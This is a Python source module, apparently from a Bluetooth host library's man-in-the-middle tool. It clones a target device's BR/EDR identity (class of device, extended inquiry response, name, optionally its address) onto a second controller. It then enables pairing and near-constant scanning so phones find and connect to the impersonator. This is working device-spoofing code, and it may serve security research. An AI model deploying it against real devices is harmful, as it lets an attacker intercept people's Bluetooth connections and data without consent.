"""BR/EDR impersonation: apply a ClonedIdentity to a downstream controller.

Writes Class of Device, EIR, local name, and enables inquiry + page scan so
that a phone can discover and connect to the impersonation device.

Allowed imports: pybluehost.cli.app.mitm.recon.ClonedIdentity,
pybluehost.cli.app.mitm.address (for clone_bd_addr),
pybluehost.hci.constants, pybluehost.hci.packets.
No l2cap/ble/classic/gap/profiles/stack.
"""

from __future__ import annotations

from typing import TYPE_CHECKING

from pybluehost.cli.app.mitm.recon import ClonedIdentity
from pybluehost.hci.constants import (
    HCI_WRITE_CLASS_OF_DEVICE,
    HCI_WRITE_EXTENDED_INQUIRY_RESPONSE,
    HCI_WRITE_INQUIRY_SCAN_ACTIVITY,
    HCI_WRITE_LOCAL_NAME,
    HCI_WRITE_PAGE_SCAN_ACTIVITY,
    HCI_WRITE_SCAN_ENABLE,
    HCI_WRITE_SIMPLE_PAIRING_MODE,
)
from pybluehost.hci.packets import HCICommand

if TYPE_CHECKING:
    from pybluehost.hci.controller import HCIController


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _name_to_padded(name: str, length: int = 248) -> bytes:
    """Encode *name* as UTF-8, truncate to *length* bytes, then zero-pad."""
    encoded = name.encode("utf-8")[:length]
    return encoded + bytes(length - len(encoded))


_EIR_MAX = 240


def _rewrite_eir_name(eir: bytes, name: str | None) -> bytes:
    """Replace the Complete (0x09)/Shortened (0x08) Local Name in the EIR with *name*.

    All other AD structures are preserved; the name is moved to the end (AD structure
    order is irrelevant to parsing). name=None returns the EIR unchanged; if the cloned
    EIR has no name field, a Complete Local Name is appended when there is room. Total
    length is clamped to 240 bytes — the name is truncated on overflow (UTF-8 cut by
    bytes, possibly mid-character, but the EIR name is display-only, so acceptable).

    Why the EIR must be rewritten: the phone's scan list prefers the EIR Complete Local
    Name over the HCI local name. The cloned EIR has the target's old name baked in, so
    changing only the local name would leave the phone showing the old name.
    """
    if name is None:
        return eir
    new_name = name.encode("utf-8")
    out = bytearray()
    replaced = False
    i = 0
    while i + 1 < len(eir):
        length = eir[i]
        if length == 0 or i + 1 + length > len(eir):
            break  # padding or truncation: no valid structure beyond
        ad_type = eir[i + 1]
        if ad_type in (0x08, 0x09) and not replaced:
            replaced = True
            i += 1 + length
            continue  # drop old name; re-inserted uniformly at the end below
        out += eir[i: i + 1 + length]
        i += 1 + length
    room = _EIR_MAX - len(out) - 2
    if room > 0:
        nm = new_name[:room]
        out.append(1 + len(nm))
        out.append(0x09)  # Complete Local Name
        out += nm
    return bytes(out)


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

# High duty-cycle scan: interval == window = 0x0028 slots × 0.625ms = 25ms ≈ always on.
# The controller's default window is small (~11-18ms/1.28s), so phones often fail to find
# the impersonated device or find it slowly; power draw is irrelevant in the MITM setup,
# so max it out (real-hardware requirement: WQ7035_MITM must be discovered instantly).
_SCAN_INTERVAL = 0x0028
_SCAN_WINDOW = 0x0028


async def start_bredr_impersonation(
    controller: "HCIController",
    identity: ClonedIdentity,
    *,
    clone_address: bool = False,
) -> None:
    """Apply the cloned BR/EDR identity to the downstream controller and enable
    inquiry+page scan so a phone can discover and connect to the impersonation.

    Default uses the controller's own BD_ADDR. ``clone_address=True`` calls
    ``address.clone_bd_addr(controller, identity.address)`` first (may raise
    ``AddressCloneUnsupported`` on chips that cannot write BD_ADDR).

    Sequence:
    1. Optionally clone BD_ADDR.
    2. Write Class of Device (3 bytes LE).
    3. Write Extended Inquiry Response (FEC=0x01 + EIR zero-padded to 240 bytes).
    4. Write Local Name (UTF-8, zero-padded to 248 bytes) — skipped if None.
    5. Write fast Inquiry/Page Scan Activity (~100% duty) so phones discover fast.
    6. Write Scan Enable = 0x03 (inquiry scan + page scan).
    """
    # 1. Optionally clone the BD_ADDR
    if clone_address:
        from pybluehost.cli.app.mitm.address import clone_bd_addr  # noqa: PLC0415
        await clone_bd_addr(controller, identity.address)

    # 2. Write Class of Device
    cod = identity.class_of_device if identity.class_of_device is not None else 0x000000
    await controller.send_command(
        HCICommand(
            opcode=HCI_WRITE_CLASS_OF_DEVICE,
            parameters=cod.to_bytes(3, "little"),
        )
    )

    # 3. Write Extended Inquiry Response — the cloned EIR still carries the target's
    #    old name; the name AD structure must first be swapped to identity.name (already
    #    overridden by name_override), otherwise the phone scan list shows the EIR name
    #    rather than the local name and the override has no effect.
    eir = _rewrite_eir_name(identity.adv_data or b"", identity.name)
    fec = bytes([0x01])
    eir_truncated = eir[:240]
    eir_padded = eir_truncated + bytes(240 - len(eir_truncated))
    await controller.send_command(
        HCICommand(
            opcode=HCI_WRITE_EXTENDED_INQUIRY_RESPONSE,
            parameters=fec + eir_padded,
        )
    )

    # 4. Write Local Name (skip if None)
    if identity.name is not None:
        await controller.send_command(
            HCICommand(
                opcode=HCI_WRITE_LOCAL_NAME,
                parameters=_name_to_padded(identity.name, 248),
            )
        )

    # 4b. Enable Secure Simple Pairing — real-hardware G3 finding: with SSP off, phone
    #     pairing fails and disconnects immediately (reason 0x13). SspTermination only
    #     answers IO_Capability etc. passively, which requires SSP enabled on the
    #     controller for those events to be generated at all.
    await controller.send_command(
        HCICommand(
            opcode=HCI_WRITE_SIMPLE_PAIRING_MODE,
            parameters=bytes([0x01]),
        )
    )

    # 5. Write fast scan activity (interval==window ≈ 25ms, always on) so phones find it instantly
    scan_activity = _SCAN_INTERVAL.to_bytes(2, "little") + _SCAN_WINDOW.to_bytes(2, "little")
    await controller.send_command(
        HCICommand(opcode=HCI_WRITE_INQUIRY_SCAN_ACTIVITY, parameters=scan_activity)
    )
    await controller.send_command(
        HCICommand(opcode=HCI_WRITE_PAGE_SCAN_ACTIVITY, parameters=scan_activity)
    )

    # 6. Enable inquiry scan + page scan
    await controller.send_command(
        HCICommand(
            opcode=HCI_WRITE_SCAN_ENABLE,
            parameters=bytes([0x03]),
        )
    )
